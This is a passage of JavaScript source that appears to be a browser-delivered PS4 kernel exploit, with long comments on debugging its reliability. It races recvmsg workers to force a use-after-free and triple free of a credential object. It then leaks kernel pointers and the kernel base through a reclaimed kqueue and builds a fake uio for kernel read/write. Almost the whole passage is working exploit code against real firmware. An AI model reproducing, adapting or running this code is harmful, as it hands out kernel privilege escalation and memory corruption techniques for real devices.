            function before this point in the body. See the note there.
            */
            function wakeRacers(count) {
                const want = Math.min(count, WAKE_SLOT_MAX);
                let woke = 0;
                for (let k = 0; k < want; ++k) {
                    const rv = sc(SYS.write, iovSs[1], scratch, 1).i32;
                    /*
                    Any non-negative return means the byte was accepted (a
                    write of 1 either writes 1 or fails). A negative is EAGAIN
                    -- buffer full -- and the correct response is to STOP, not
                    to keep calling: the next one would sleep.
                    */
                    if (rv < 0) { wakeRefused++; break; }
                    woke++;
                }
                wakeWrites += woke;
                return woke;
            }

            /*
            One real event-loop turn, then count what is still parked. The old
            code did this ONLY on round 1 (inside `parkedSeen < 0`), so it was
            blind to a worker that parked late -- and a worker still parked
            here is the only thing that can make unparkAll() never return.
            */
            async function parkTick(ts) {
                await new Promise(r => setTimeout(r, 0));
                return ts.filter(t => !t.settled).length;
            }
            /*
            WAIT FOR THE RACERS TO ACTUALLY GET INSIDE THE KERNEL.

            parkTick gives the park one macrotask and then counts unsettled
            promises. That is NOT the same as "parked in recvmsg": a worker
            whose ROP has not been scheduled yet is indistinguishable from one
            blocked in the kernel, so IOV-PARKED 4/4 has never proven the park
            landed.

            That matters because the wake below is addressed to parked racers.
            Writing wake bytes for workers that have not entered recvmsg is how
            a byte survives a round and desynchronises the next one.

            This waits -- bounded by `ms` -- for the count to stop decreasing,
            i.e. for no FURTHER promise to settle. Once settling has stopped,
            whatever is left is either genuinely parked or wedged, and either
            way the same set gets the wake.

            `ms` is a PARAMETER, not a captured constant. It used to close over
            PARK_SETTLE_MS, which is a const declared far above the RACE that
            uses it -- but the PRE-REFCOUNT loop calls this function much
            earlier in the same function body, before that const has been
            initialised. A hoisted function body that reads a not-yet-
            initialised const is a TDZ ReferenceError, on the first attempt,
            in the exact window this file has been crashing in. Taking the
            budget as an argument removes the ordering dependency entirely:
            every caller passes what it already has in scope.
            */
            async function parkSettle(ts, ms) {
                const deadline = Date.now() + (ms === undefined
                    ? PARK_SETTLE_MS : ms);
                let last = ts.filter(t => !t.settled).length;
                while (Date.now() < deadline) {
                    await new Promise(r => setTimeout(r, 0));
                    const now = ts.filter(t => !t.settled).length;
                    if (now === last) break;
                    last = now;
                }
                return last;
            }

            function fireTracked(w) {
                /*
                timeoutMs = 0 means "wait forever" in makeRpc (workers.js:57),
                and that is deliberate: a parked racer is the point, and a
                timeout would turn the park into a rejection. The bound lives
                in scheduleJoin() instead, at the join, where we can still
                report how many were outstanding -- a per-call timeout would
                reject the promise and lose the count.
                */
                const t = fireW(w, SYS.recvmsg, [iovSs[0], msgAddr, 0], 0);
                t.settled = false;
                t.then(() => { t.settled = true; }, () => { t.settled = true; });
                return t;
            }
            const tasks = new Array(iovWorkers.length);
            let parkedSeen = -1;
            const raceT0 = Date.now();
            const raceDeadline = raceT0 + RACE_MS;
            for (let i = 0; i < NUM_IOV_SPRAY && !reclaimed; ++i) {
                /*
                breathe() EVERY round (~16 synchronous ROP syscalls: 4 fireW +
                sched_yield + getsockopt + up to 8 writes/reads). The file's own
                comment says the event loop is turned once per round here; it
                was not -- the only below-budget turn was the one-off
                setTimeout inside the `parkedSeen < 0` block, which runs on the
                FIRST round only. After that the loop yielded through
                sc(sched_yield) alone for up to NUM_IOV_SPRAY rounds.
                */
                await breathe();
                rounds = i + 1;
                for (let k = 0; k < iovWorkers.length; ++k) tasks[k] = fireTracked(iovWorkers[k]);
                sc(SYS.sched_yield);
                /*
                OBSERVE EVERY ROUND, not just round 1, and record the master's
                refcnt. When the race stops right after IOV-PARKED the question
                is always the same -- did the master ever come back with a
                refcnt other than 0/1, or did it come back with nothing at all
                -- and neither was answerable from the log because the read
                result was consumed by the `=== 1` test and thrown away.
                */
                const tick = await parkTick(tasks);
                if (parkedSeen < 0) {
                    parkedSeen = tick;
                    mark("IOV-PARKED", parkedSeen + "/" + iovWorkers.length);
                }
                /*
                FRESH, or nothing. `rr >= 0 && rcnt === 1` accepted a read
                that getRthdr reported as long-enough while leakDv still held
                the PREVIOUS round's bytes -- and the previous round's bytes
                are exactly the refcnt this loop is waiting to see become 1. A
                short copyout therefore read as success: the loop declares the
                race won on a stale refcnt, breaks, and hands make_karw a
                triple that was never actually driven to 1.

                freshRthdr answers the question the loop actually has (are
                these bytes from THIS call?) instead of the question rr
                answers (did the call report success?). The `=== 1` test then
                gates on fr.ok, so a stale read is a `readfail` in the log
                rather than a false win.
                */
                const fr = freshRthdr(twins.a, IP6_RTHDR0_SIZE, 8);
                const rcnt = fr.ok ? leakDv.getInt32(0, true) : fr.why;
                if (raceReads.length < 16)
                    raceReads.push("r" + i + ":" + rcnt + "/p" + tick);
                if (fr.ok && rcnt === 1) { reclaimed = true; break; }
                /*
                LAST MARK BEFORE THE WAKE.

                "IOV-PARKED 4/4 then nothing" has been the whole failure
                report for several runs, and nothing between that line and the
                round-tail Promise.all ever printed -- so the death could not
                be localized to a call. This mark is issued immediately before
                unparkAll(), which is the FIRST thing after IOV-PARKED that
                touches the kernel with the racers still parked.

                Reading the next run:
                  IOV-PARK  ok  ->  [nothing]   death is in the wake (the four
                                                recvmsg returns), i.e. inside
                                                the kernel. That is the race
                                                being lost, not a JS bug.
                  IOV-PARK  ok  ->  IOV-RETS    the wake completed; look at
                                                recvmsg_rv and parked_now.

                rcnt_ok separates the two reasons the loop keeps running: a
                read that came back but was not 1, versus a read that failed.
                */
                mark("IOV-PARK", "round=" + (i + 1) + "/" + NUM_IOV_SPRAY
                    + " master=" + twins.a + " rcnt=" + rcnt
                    + " rcnt_ok=" + fr.ok + " parked=" + tick + "/" + iovWorkers.length
                    + " ms=" + (Date.now() - raceT0));
                /*
                DEADLINE. Bounded by the wall clock rather than by NUM_IOV_SPRAY
                rounds, and checked AFTER the observation above so a timeout run
                still reports the reads it did make. falling out of the loop
                with `reclaimed` false lands in the existing !reclaimed retry
                tail, which burns the twins and releases the racers -- so this
                is a clean early exit, not a new failure mode.
                */
                if (Date.now() > raceDeadline) {
                    mark("RACE-TIMEOUT", "rounds=" + rounds + "/" + NUM_IOV_SPRAY
                        + " ms=" + (Date.now() - raceT0) + " parked=" + parkedSeen
                        + "/" + iovWorkers.length
                        + " last=" + raceReads.slice(-4).join(" "));
                    /*
                    Free the racers BEFORE leaving. Breaking out with workers
                    inside recvmsg is what turns the timeout into a cascade:
                    the tail's parkTick, the !reclaimed retry tail, the twin
                    teardown and finally the worker disarm all find them
                    parked, and the first bounded fire() reports the timeout.
                    */
                    await rescueRacers(tasks, "race-timeout");
                    break;
                }
                const leftAfterUnpark = await unparkAll(tasks);
                /*
                THEN RESCUE THE ONES unparkAll COULD NOT FREE, IN THE SAME
                ROUND. This is the fix for "worker-N: timeout waiting for
                fire" during the unpark phase: without it, a racer that is one
                wake byte short stays inside recvmsg until a LATER round's
                fire() runs -- and that later round is the one that reports
                the timeout, so the log blames a round that did nothing wrong.
                */
                if (leftAfterUnpark) await rescueRacers(tasks, "unpark-left-"
                    + leftAfterUnpark);
                else conserveWakes();
            }
            const rets = tasks.map(function (t, k) {
                return iovWorkers[k].ctx.frameDv.getInt32(0, true);
            });
            const stillParked = await parkTick(tasks);
            mark("IOV-RETS", "rounds=" + rounds + " recvmsg_rv=" + rets.join(",")
                + " parked_now=" + stillParked + "/" + iovWorkers.length
                + " ms=" + (Date.now() - raceT0)
                + (raceReads.length ? " reads=" + raceReads.join(" ") : ""));
            /*
            LAST CHANCE BEFORE THE TAIL STARTS FIRING BOUNDED CALLS.
            Anything still inside recvmsg here is about to be reported as a
            fire() timeout by the teardown, twice (here and in the !reclaimed
            tail), which is how one lost wake byte turns into a page of
            "timeout waiting for fire".
            */
            if (stillParked) await rescueRacers(tasks, "iov-rets");
            check("cr_refcnt-driven-1", reclaimed,
                "rounds=" + rounds + " parked=" + parkedSeen + "/" + iovWorkers.length);
            if (!reclaimed) {

                /*
                ITEM 6(b). This used to `break`, which is why attempts=8 never
                produced a second try: 7 of 89 armed runs die exactly here.
                twins.a/twins.b DO alias the freed chunk now, so a bare retry
                would re-spray them and free memory another socket owns. Burn
                them, release the parked racers, drop the spent uafSock, and
                only then go round again.
                */
                const leakStillParked = await unparkAll(tasks);
                raceReads.push("tail:parked" + leakStillParked);
                /*
                AND FREE THEM FOR REAL BEFORE THE RETRY. `continue` goes
                straight back to the top of the RACE, which fires a fresh
                racer on every worker -- and fireW throws "worker-N: timeout
                waiting for fire" if that worker is still inside the previous
                round's recvmsg. Rescuing here is what stops one lost wake
                byte from poisoning the whole remaining attempt budget.
                */
                if (leakStillParked) await rescueRacers(tasks, "retry-tail");
                else conserveWakes();
                burn(twins.a, "refcount-drive");
                burn(twins.b, "refcount-drive");
                twins = null;
                if (uafSock > 0) { sc(SYS.close, uafSock); uafSock = 0; }
                mark("ATTEMPT-RETRY", "after=refcount-drive burned="
                    + burned.size + " next=" + (attempt + 1) + "/" + NUM_ATTEMPT);
                continue;
            }

            const d2 = sc(SYS.dup, uafSock).i32;
            if (d2 === -1) { mark("ATTEMPT-SKIP", "second dup failed"); break; }
            sc(SYS.close, d2);
            /*
            `reclaimed` is the PROOF that the refcount was driven to 1 -- it
            is set by the race loop on a fresh read of 1, and the !reclaimed
            branch continues above. Printing it here ties this triple free to
            the evidence that justified it, so a crash after TRIPLE-FREE can be
            read against the rounds count and the race reads from IOV-RETS.
            */
            mark("TRIPLE-FREE", "dup_fd=" + d2 + " (NEW FD, not a count)"
                + " closed; uaf_sock=" + uafSock
                + " attempt=" + attempt + "/" + NUM_ATTEMPT
                + " race_rounds=" + rounds
                + " parked_seen=" + parkedSeen
                + " refcnt_reached_1=true");

            const t0 = twins.a;

            /*
            POST-TRIPLE is the FIRST read after the triple free, so it is the
            one the whole stage is calibrated on. It used to print `ptOk ?
            leakDv... : "readfail"` -- which gates on getRthdr but cannot tell a
            fresh read from the race loop's stale one (getRthdr leaves leakDv
            untouched on failure), and it printed a bare `idx` with no way to
            know whether that word was even tagged. masterTagInfo() answers
            both: it names the failure (readfail vs sentinel) and it labels
            the tag, so an UNTAGGED master is visible here instead of three
            stages later at findTriplet's `-MISS` line.
            */
            const ptIdx = masterTagInfo(t0, "idx");
            mark("POST-TRIPLE", "master=" + t0 + " twin=" + twins.b
                + " idx " + ptIdx);

            /*
            UNPARK BEFORE THE TAG SPRAY, and this is the fix, not a tidy-up.

            findTriplet re-sprays setRthdr across every socket, and on a socket
            that already owns an rthdr that is a FREE-THEN-REALLOC. Running it
            while the four racers are still parked means the spray lands on the
            chunk whose refcount the racers have not finished decrementing yet:
            we free and re-tag the object underneath a race we are trying to
            settle, then unpark afterwards and hope the counts still line up.
            The unpark IS the settling operation, so it has to come first.

            The reference (netctrl_snapshot.js:884-890) has the same order as
            the old code here, so this is inherited rather than introduced --
            but inline-and-late is still wrong, and it is why a T1 miss is a
            dead end: by the time we look, the chunk has been sprayed over.
            */
            const relParked = await unparkAll(tasks);
            /*
            THE RACERS MUST BE OUT BEFORE ANYTHING READS THEIR FRAMES. The
            two lines below read every worker's frame word, and every stage
            after this one fires bounded calls at these same workers -- so a
            racer left inside recvmsg here is reported as a fire() timeout a
            few statements later, not as the wake accounting bug it is.
            */
            if (relParked) await rescueRacers(tasks, "iov-released");
            else conserveWakes();
            const rets2 = tasks.map(function (t, k) {
                return iovWorkers[k].ctx.frameDv.getInt32(0, true);
            });
            const relTag = masterTagInfo(t0, "master");
            mark("IOV-RELEASED", "recvmsg_rv=" + rets2.join(",")
                + " parked_after=" + relParked + "/" + iovWorkers.length
                + " master " + relTag);

            /*
            IF THE MASTER IS NOT TAGGED, THE TRIPLET SEARCH CANNOT SUCCEED.

            findTriplet resolves t1/t2 by reading the MASTER's tag word. When
            the master reads UNTAGGED (0x0 -- a well-formed rthdr with no tag),
            there is no idx in it to resolve, so every round sprays and reads
            back nothing usable. That is exactly the run that hung here:

              POST-TRIPLE   master=32 twin=66 idx=0x0/UNTAGGED refcnt=1
              IOV-RELEASED  ... master=0x0/UNTAGGED refcnt=1
            and then findTriplet burned all 500 rounds (and, on a refind,
            FIND_TRIPLET_FAST 5000 x 3) scanning a master that never had an idx
            to give. A tagged master is a PRECONDITION of the search, not a
            result of it, so test it once here and refuse to spend the budget
            when it does not hold.

            Why not retry: a triple free has ALREADY happened (TRIPLE-FREE
            above), so the chunk is freed three times over. The master not
            being tagged means we cannot name the other owners -- the same
            condition as TRIPLET-MISS -- and the one path that must not retry.
            Burn the master, mark uncontained, and let the attempt loop stop.
            */
            const masterTagged = masterTagInfo(t0, "m");
            if (masterTagged.indexOf("/UNTAGGED") >= 0
                || masterTagged.indexOf("readfail") >= 0
                || masterTagged.indexOf("sentinel") >= 0) {
                mark("TRIPLET-MASTER-UNTAGGED", "master=" + t0 + " "
                    + masterTagged + " -- skipping the triplet search;"
                    + " a triple free already happened so this is not retryable");
                burn(t0, "master-untagged");
                if (twins && twins.b) burn(twins.b, "master-untagged");
                uncontained = "master-untagged";
                check("master-tagged-before-triplet-search", false,
                    masterTagged);
                continue;
            }

            const t1 = await findTriplet(t0, -1, "T1", MAX_ROUNDS_TRIPLET);
            const t2 = await findTriplet(t0, t1, "T2", MAX_ROUNDS_TRIPLET);
            /*
            VERIFY THE ALIASING BEFORE PRONOUNCING IT.

            findTriplet resolves a triplet from a TAG WORD it read back off the
            master, and that word can be stale (a failed setRthdr, a short
            copyout). Nothing above reads the three sockets back. So the check
            at the bottom of this loop used to stamp `ucred-triple-freed` on the
            existence of the ARRAY, and every consumer below (leak_kqueue,
            make_karw, all the kread/kwrite) then took three fds on faith that
            may not alias the same chunk. That is the "shape, not freshness"
            defect this file's own freshRthdr comment warns about, surviving in
            the one place it matters most.

            tripletsAgree() reads all three back through freshRthdr and requires
            the same tag. Run it HERE, at the moment we name the triplet, so the
            proof and the burn decision are both made on measured aliasing.
            tripletsAgree is function-hoisted, and tripletsUsable() only checks
            fds are in the pool -- this is the real test.
            */
            if (t1 && t2) {
                triplets = [t0, t1, t2];
                mark("TRIPLETS", triplets.join(","));
                if (!tripletsAgree("TRIPLE-FREE")) {
                    /*
                    We named three owners and they do NOT read back as the same
                    chunk, so this is not a verified triple free. Do not burn
                    (burning frees the chunk they alias, and we cannot trust
                    which one that is) and do not retry -- the triple free has
                    already happened. Mark it uncontained so the attempt loop
                    stops, and leave triplets null so nothing downstream reads
                    three fds we could not confirm.
                    */
                    mark("TRIPLET-UNVERIFIED", "triplets=" + triplets.join(",")
                        + " -- named but did not read back as one chunk;"
                        + " not trusting them downstream");
                    triplets = null;
                    uncontained = "triplet-unverified";
                }
            } else {

                /*
                A triple free happened and we could not name all three owners,
                so we cannot burn what we cannot identify. This is the one path
                that must NOT retry -- poops.js:4356 refuses here too.
                */
                mark("TRIPLET-MISS", "t1=" + t1 + " t2=" + t2);
                burn(t0, "triplet-miss");
                if (t1) burn(t1, "triplet-miss");
                if (twins && twins.b) burn(twins.b, "triplet-miss");
                uncontained = "triplet-miss";
            }
        }

        /*
        THE PROOF ITSELF. `!!triplets` alone is satisfied by any three numbers;
        the loop above now only leaves triplets set when tripletsAgree() read
        all three back as the same chunk, so this test is finally asserting the
        thing its name claims. Report WHICH gate failed so a miss is not silent.
        */
        check("ucred-triple-freed",
            !!triplets && tripletsUsable(),
            triplets ? triplets.join(",")
                : (uncontained === "triplet-unverified"
                    ? "named but unverified (see TRIPLET-UNVERIFIED)"
                    : "no triplet"));

        let kernelBase = null, kqFdp = null, kqFd = -1;
        if (triplets) {
            if (off.k_kl_lock === undefined || off.k_kl_lock === 0) {
                mark("KQUEUE-SKIPPED", "reason=no-k_kl_lock");
            } else {
                state("leaking a kqueue...", "warn");

                freeRthdr(triplets[2]);
                sc(SYS.sched_yield);
                sc(SYS.sched_yield);
                let leaked = false, tries = 0, hitRound = -1;
                let openKq = -1;
                /* Consecutive kqueue() EMFILE results; see the guard below. */
                let emfileStreak = 0;

                /*
                Mirrors smaller-kernel-script/netctrl.js leak_kqueue() line
                for line: ONE kqueue open at a time, closed every iteration,
                and the hit test is the 0x1430000 header word ALONE. The
                previous version gated on a 0xa0 copyout length AND a nonzero
                kq_fdp word -- both conditions can fail while the reclaim is
                real (a short copyout leaves the magic from THIS read in the
                buffer's first 8 bytes, which is all the reference checks),
                so a successful leak was being rejected every boot.
                */
                for (let i = 0; i < NUM_LEAK_KQUEUE; ++i) {
                    /*
                    breathe() EVERY iteration, not every 32.

                    NUM_LEAK_KQUEUE is 5000 and each iteration is at least
                    TWO synchronous sc() ROP syscalls (kqueue + getsockopt),
                    plus a close on the miss path -- so the old `(i & 0x1f)`
                    checkpoint allowed 32 x 3 = ~96 syscalls of unbroken CPU
                    before one 0 ms timer. That is the "The Page Isn't
                    Loading" popup at "leaking a kqueue...". This scan runs
                    AFTER the refcount race, so there is no timing to
                    disturb; yielding costs one Date.now() when under budget.
                    */
                    await breathe();
                    tries = i + 1;
                    const kq = sc(SYS.kqueue).i32;
                    if (kq === -1) {
                        /*
                        EMFILE IS TERMINAL FOR THIS SCAN, NOT A RETRY.

                        The old code marked and `continue`d. kqueue() failing
                        with EMFILE does not fix itself -- the process is at
                        its fd ceiling and this loop is not releasing any -- so
                        that spun the full NUM_LEAK_KQUEUE (5000) iterations,
                        each doing kqueue + sched_yield AND a mark(). mark()
                        does a full innerHTML re-render plus an XHR post
                        (log.js:247), so an EMFILE run was 5000 synchronous DOM
                        writes in one stretch. That is the "The Page Isn't
                        Loading" popup at exactly this line in the log.

                        Two consecutive failures after we have opened and
                        closed nothing successful is enough to conclude the
                        ceiling is hit for good. Report once and stop.
                        */
                        if (openKq >= 0) { sc(SYS.close, openKq); openKq = -1; }
                        if (++emfileStreak >= 2) {
                            mark("KQUEUE-EMFILE", "at=" + i + " -- fd ceiling"
                                + " hit, abandoning the scan");
                            break;
                        }
                        continue;
                    }
                    emfileStreak = 0;
                    openKq = kq;

                    /*
                    CHECKED. getRthdr returns -1 on rv != 0 OR on a short
                    copyout, and -1 means leakDv was NOT refreshed -- it still
                    holds the previous call's bytes (or the 0xee sentinel).
                    Every other call site in this file guards on that (see
                    findTwins / findTriplet). This one discarded it, so a short
                    KQUEUE_SIZE (0x100) read could leave stale bytes that
                    happened to match the magic and report a FALSE leak -- which
                    then feeds garbage into klLock/kqFdp and the kernelBase
                    arithmetic below.
                    */
                    if (getRthdr(triplets[0], KQUEUE_SIZE) < 0) {
                        sc(SYS.close, openKq);
                        openKq = -1;
                        continue;
                    }

                    /*
                    Reference test: the header qword at +8 only. R2's 0xee
                    sentinel fill guarantees these words came from THIS call,
                    so a plain magic check cannot read a previous call's data.
                    */
                    if (leakDv.getUint32(8, true) === KQ_HDR_MAGIC
                        && leakDv.getUint32(12, true) === 0) {
                        leaked = true; hitRound = i;
                        break;
                    }

                    /* Close to free the buffer, exactly as the reference. */
                    sc(SYS.close, openKq);
                    openKq = -1;

                    if (i && i % 500 === 0)
                        mark("KQUEUE-ROUND", "i=" + i);
                }

                if (leaked && openKq >= 0) {
                    kqFd = openKq;
                    openKq = -1;
                } else if (openKq >= 0) {
                    sc(SYS.close, openKq);
                }
                check("kqueue-reclaimed-freed-chunk", leaked,
                    "tries=" + tries
                    + (leaked ? " fd=" + kqFd + " at=" + hitRound : ""));
                if (leaked) {
                    const klLock = new int64(leakDv.getUint32(0x60, true),
                        leakDv.getUint32(0x64, true));
                    kqFdp = new int64(leakDv.getUint32(0x98, true),
                        leakDv.getUint32(0x9c, true));
                    kernelBase = klLock.sub32(off.k_kl_lock);
                    mark("KQUEUE-LEAK", "kl_lock=" + klLock + " kq_fdp=" + kqFdp);
                    mark("KERNEL-BASE", kernelBase + " = kl_lock-0x"
                        + off.k_kl_lock.toString(16));

                    try {
                        const kbNow = "" + kernelBase;
                        const kbLast = localStorage.getItem("ps4lab_kernel_base");
                        if (kbLast === kbNow)
                            mark("SAME-BOOT-AS-LAST-RUN", "kernel_base=" + kbNow);
                        localStorage.setItem("ps4lab_kernel_base", kbNow);
                    } catch (e) { }

                    /*
                    GATED, and it has to be. These two checks used to run and
                    the close+respay below ran REGARDLESS of their result --
                    check() records a pass/fail and returns; it stops nothing.

                    That is the panic. kqFd is the kqueue we aimed at the freed
                    triplet[2] chunk. If the leak did not actually land -- a
                    false header-magic hit from a DIFFERENT kernel object, or a
                    k_kl_lock that is wrong for this firmware so kernelBase is
                    garbage -- then closing kqFd frees a chunk that some other
                    owner still has, and the findTriplet that follows re-sprays
                    setRthdr across every socket onto that same freed memory.
                    Use-after-free, kernel panic, every run that takes the path.

                    So the close and the respray now happen ONLY when the
                    pointers the leak produced are actually pointer-shaped. If
                    they are not, we drop kqFd and leave the triplets alone --
                    the run reports a failed leak instead of corrupting the
                    kernel.
                    */
                    /*
                    SENTINEL CHECK FIRST, and it has to be SEPARATE from
                    isKernelPtr.

                    kq_fdp is read at +0x98/0x9c of a copyout whose ONLY
                    verified field is the header magic at +8. When that copyout
                    stops short of 0xa0 -- which it does, and the log shows it
                    doing it -- everything past the copied region is STILL R2's
                    0xee sentinel, and 0xeeee is not a kernel
                    pointer by isKernelPtr (hi 0xeeee < 0xffff0000), so
                    leakOk would already be false.

                    But leakOk being false did NOT stop make_karw, and that is
                    the actual defect this run tripped over. make_karw gates on
                    `kernelBase && triplets && kqFdp`, and a sentinel-filled
                    kqFdp is a truthy object -- so the walk ran against
                    0xeeee, kread8 refused it, fdtOfiles came back
                    null, and every kptr() test downstream failed. The whole
                    stage was dead the moment this read landed short, and the
                    PROOF-FAIL is reporting the symptom eight lines later.

                    Name the sentinel explicitly so the log says WHAT happened
                    rather than leaving it to be inferred from a hex value.
                    */
                    const sentinelKq = (kqFdp.low >>> 0) === 0xeeee
                        && (kqFdp.hi >>> 0) === 0xeeee;
                    const leakOk = isImageAddr(klLock) && isKernelPtr(kqFdp);
                    check("kl_lock-kq_fdp-kernel-pointers", leakOk,
                        "kl_lock.hi=" + hx(klLock.hi) + " kq_fdp.hi=" + hx(kqFdp.hi)
                        + (sentinelKq ? " kq_fdp=UNCOPIED-SENTINEL(copyout short of 0xa0)" : ""));
                    const baseOk = (kernelBase.low & 0x3fff) === 0;
                    check("kernel-base-0x4000-aligned", baseOk,
                        "low=" + hx(kernelBase.low));

                    sc(SYS.close, kqFd);
                    /*
                    POISON kqFdp on refusal. Leaving it set is what let a
                    rejected leak flow into make_karw: a truthy object with no
                    provenance satisfies `&& kqFdp` in the gate below. Nulling
                    it makes that gate do its job and turns an eight-line
                    cascade of KREAD-REFUSED into ONE honest line here.
                    */
                    if (!leakOk || !baseOk) {
                        /*
                        Refuse to respray. kqFd is closed (that is the
                        reclaim, and it is irreversible either way), but
                        findTriplet would re-spray setRthdr across all 256
                        sockets targeting a chunk we could not validate -- a
                        use-after-free. Leave triplets[2] as it is and mark
                        the leak failed so nothing downstream trusts it.
                        */
                        mark("KQUEUE-LEAK-REFUSED", "leak_ok=" + leakOk
                            + " base_ok=" + baseOk
                            + (sentinelKq ? " kq_fdp=SENTINEL" : "")
                            + " -- not respraying, and make_karw is now BLOCKED");
                        triplets[2] = 0;
                        kqFdp = null;
                        if (sentinelKq)
                            rebootReason = "kqueue-leak: kq_fdp unread (copyout short of 0xa0)";
                        check("triplets2-re-found-after-kqueue-leak", false,
                            "refused: leak validation failed");
                    } else {
                        triplets[2] = await findTriplet(triplets[0], triplets[1], "KQ", MAX_ROUNDS_TRIPLET);
                        mark("POST-KQUEUE", "kq_fd=" + kqFd + " closed triplets="
                            + triplets.join(","));
                        check("triplets2-re-found-after-kqueue-leak",
                            !!triplets[2], triplets.join(","));
                    }
                }
            }
        }

        function fakeUio(uioIov, resid, rw) {
            new Uint8Array(iovAb).fill(0);
            put(iovDv, 0x00, uioIov);
            iovDv.setUint32(0x08, NUM_UIO_IOV, true);
            put(iovDv, 0x10, -1);
            put(iovDv, 0x18, resid);
            iovDv.setUint32(0x20, UIO_SYSSPACE, true);
            iovDv.setUint32(0x24, rw, true);
            put(iovDv, 0x28, 0);
        }
        function restoreRefcntIov() {
            new Uint8Array(iovAb).fill(0);
            put(iovDv, 0, 1); put(iovDv, 8, 1);
        }

        async function landUio(size, forWrite, tasks) {
            if (!tripletsUsable()) {
                mark("UIO-LAND-REFUSED", "triplets="
                    + triplets.join(",")); return null;
            }

            trace("UIO-LAND", "call=" + (forWrite ? "readv" : "writev")
                + " size=" + size);
            freeRthdr(triplets[2]);

            /*
            ITEM 5a. landFakeUio has a deadline; this one did not, so a run
            where the chunk is never re-taken spins all NUM_UIO_SPRAY rounds
            and only then unwinds. Bound it the same way. poops.js:4640.
            */
            const uioDeadline = Date.now() + (params.has("uioms")
                ? parseInt(params.get("uioms"), 10) : 30000);
            for (let i = 0; i < NUM_UIO_SPRAY; ++i) {
                /*
                breathe() FIRST, every iteration -- same reasoning as
                landFakeUio above. NUM_UIO_SPRAY is 10000 rounds, each one
                4 fireW + sched_yield + getsockopt + 5 writes/reads, with no
                event-loop yield anywhere in the loop body. sc(sched_yield)
                is a syscall, not a yield: it does not let the JSC sweeper run
                and does not reset the watchdog. Ported from lapse.js, which
                calls await breathe() inside every socket loop.
                */
                await breathe();
                if ((i & 0x3f) === 0 && Date.now() > uioDeadline) {
                    mark("UIO-LAND-TIMEOUT", "rounds=" + i);
                    break;
                }
                if (i && i % 256 === 0) mark("UIO-LAND-ROUND", "i=" + i);
                for (let k = 0; k < uioWorkers.length; ++k)
                    tasks[k] = fireW(uioWorkers[k],
                        forWrite ? SYS.readv : SYS.writev,
                        [forWrite ? uioSs[0] : uioSs[1], uioIovAddr, NUM_UIO_IOV], 0);
                sc(SYS.sched_yield);

                if (getRthdr(triplets[0], IOVEC_SIZE) >= 0
                    && leakDv.getInt32(8, true) === NUM_UIO_IOV) {
                    return new int64(leakDv.getUint32(0, true),
                        leakDv.getUint32(4, true));
                }
                if (forWrite) {
                    for (let k = 0; k < uioWorkers.length; ++k)
                        sc(SYS.write, uioSs[1], scratch, size);
                } else {
                    sc(SYS.read, uioSs[0], scratch, size);
                    for (let k = 0; k < uioWorkers.length; ++k)
                        sc(SYS.read, uioSs[0], scratch, size);
                }
                /*
                BOUNDED. `tasks` are fired with timeoutMs 0, so a bare
                Promise.all here hangs forever on a racer that never parks
                back out -- and this runs up to NUM_UIO_SPRAY (10000) times,
                so one lost racer would park the main thread for good.
                */
                await scheduleJoin(tasks, UNPARK_MS);
                if (!forWrite) sc(SYS.write, uioSs[1], scratch, size);
            }
            return null;
        }

        async function landFakeUio(tasks) {
            if (!tripletsUsable()) {
                mark("FAKEUIO-REFUSED", "triplets="
                    + triplets.join(",")); return false;
            }
            trace("FAKEUIO-LAND", "target=" + triplets[0] + " freed=" + triplets[1]);
            freeRthdr(triplets[1]);

            const fakeDeadline = Date.now() + (params.has("fakeuioms")
                ? parseInt(params.get("fakeuioms"), 10) : 30000);
            for (let i = 0; i < NUM_IOV_SPRAY_MAX; ++i) {
                /*
                breathe() FIRST, every iteration.

                This loop runs to NUM_IOV_SPRAY_MAX = 100000 iterations, each
                doing 4 fireW + sched_yield + getsockopt + 4 writes + 4 reads
                (~14 synchronous ROP syscalls), and it previously had NO
                event-loop yield at all -- only sc(SYS.sched_yield), which
                hands the CPU to another THREAD and does not turn the JS event
                loop. On a run where the chunk is never re-taken that is one
                unbroken synchronous stretch of well over a million syscalls:
                the watchdog fires and the console shows "The Page Isn't
                Loading". This is the single hottest loop in the file.

                Placed before the deadline check so the check is also reached
                promptly -- a deadline that is only tested once per 64
                iterations is not a deadline.
                */
                await breathe();
                if ((i & 0x3f) === 0 && Date.now() > fakeDeadline) {
                    mark("FAKEUIO-TIMEOUT", "rounds=" + i);
                    break;
                }
                if (i && i % 500 === 0) mark("FAKEUIO-ROUND", "i=" + i);
                for (let k = 0; k < iovWorkers.length; ++k)
                    tasks[k] = fireW(iovWorkers[k], SYS.recvmsg,
                        [iovSs[0], msgAddr, 0], 0);
                sc(SYS.sched_yield);
                if (getRthdr(triplets[0], UIO_SIZE + IOVEC_SIZE) >= 0
                    && leakDv.getUint32(0x20, true) === UIO_SYSSPACE) return true;
                /*
                DRAIN, THEN BOUND AND CHECK. This loop runs up to
                NUM_IOV_SPRAY_MAX (100000) rounds, so a write that blocks on a
                full buffer parks the thread permanently -- and because these
                racers are UNTAGGED (plain fireW), racerMask cannot tell a
                parked one from a finished one here, which is exactly why
                releaseIov treats untagged sets conservatively. Waking one byte
                per worker after a drain is the conservative form that cannot
                overfill.
                */
                conserveWakes();
                wakeRacers(iovWorkers.length);
                /* BOUNDED -- see landUio. NUM_IOV_SPRAY_MAX (100000) rounds of
                   an unbounded join is the worst of these loops. */
                await scheduleJoin(tasks, UNPARK_MS);
                for (let k = 0; k < iovWorkers.length; ++k)
                    sc(SYS.read, iovSs[0], scratch, 1);
            }
            return false;
        }

        function tripletsUsable() {
            return triplets && triplets.length === 3
                && triplets.every(fd => fd > 0 && ipv6.indexOf(fd) >= 0);
        }

        async function releaseIov(itasks) {
            /*
            WAKE COUNT IS DERIVED WHEN IT CAN BE, CONSERVATIVE WHEN IT CANNOT.

            Callers build `itasks` two different ways, and only one of them
            tags the promises:

              * landUio / landFakeUio / unwind -> plain fireW(), untagged.
              * the race -> fireTracked(), which sets `.settled`.

            An untagged promise reads `t.settled === undefined`, which is
            falsy, so a naive `!t.settled` count would call EVERY worker parked
            and reproduce the old fixed-size behaviour -- silently, while
            pretending to be measured. That is worse than not counting.

            So: if the array is tagged, wake only the still-parked ones. If it
            is not, wake all of them, which is what these callers have always
            done and is correct for them -- every one of those call sites fires
            exactly iovWorkers.length recvmsg racers before calling here.

            The drain is bounded by the same `wake` count and breaks on
            EAGAIN, so with iovSs now O_NONBLOCK a short queue is a counted
            no-op rather than a permanent park of the WebProcess.
            */
            const tagged = itasks.some(t => t && typeof t.settled === "boolean");
            const wake = tagged
